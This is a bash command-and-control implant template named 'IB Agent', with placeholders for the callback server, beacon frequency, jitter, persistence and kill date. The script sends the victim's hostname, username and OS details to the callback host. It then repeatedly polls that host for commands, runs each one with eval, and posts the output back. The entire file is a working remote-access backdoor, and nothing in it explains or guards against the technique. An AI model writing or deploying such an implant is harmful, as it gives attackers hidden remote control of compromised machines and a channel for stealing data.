#!/bin/bash
# IB Agent — Bash
CB="[CALLBACK]"
FREQ=[FREQ]
JITTER=[JITTER]
RETRY_MAX=[RETRY_MAX]
LABEL="[LABEL]"
[PROXY_SETUP]
hname=$(hostname 2>/dev/null || echo unknown)
uname_val=$(whoami 2>/dev/null || echo unknown)
os_info=$(uname -srm 2>/dev/null || echo unknown)

resp=$(curl -sk -X POST "$CB/agent/checkin" \
  -H "Content-Type: application/json" \
  -d "{\"hostname\":\"$hname\",\"username\":\"$uname_val\",\"os_info\":\"$os_info\",\"script\":\"$LABEL\"}")

agent_id=$(echo "$resp" | python3 -c "import sys,json;print(json.load(sys.stdin)['agent_id'])" 2>/dev/null)
[ -z "$agent_id" ] && exit 1
[PERSIST_CODE]
_backoff=1
while true; do
  [KILLDATE_CHECK]
  raw=$(curl -sk -w "\n%{http_code}" "$CB/agent/cmd/$agent_id")
  code=$(echo "$raw" | tail -1)
  body=$(echo "$raw" | sed '$d')
  if [ "$code" = "200" ]; then
    _backoff=1
    cmd_id=$(echo "$body" | python3 -c "import sys,json;print(json.load(sys.stdin)['id'])" 2>/dev/null)
    command=$(echo "$body" | python3 -c "import sys,json;print(json.load(sys.stdin)['command'])" 2>/dev/null)
    output=$(eval "$command" 2>&1)
    curl -sk -X POST "$CB/agent/res/$cmd_id" -d "$output" >/dev/null 2>&1
  else
    [ "$RETRY_MAX" -gt 1 ] && [ "$_backoff" -lt "$RETRY_MAX" ] && _backoff=$((_backoff + 1))
  fi
  sleep $(awk "BEGIN{srand();f=$FREQ*$_backoff;j=$JITTER;if(j>0)print f*(1+(rand()*2-1)*j/100);else print f}")
done
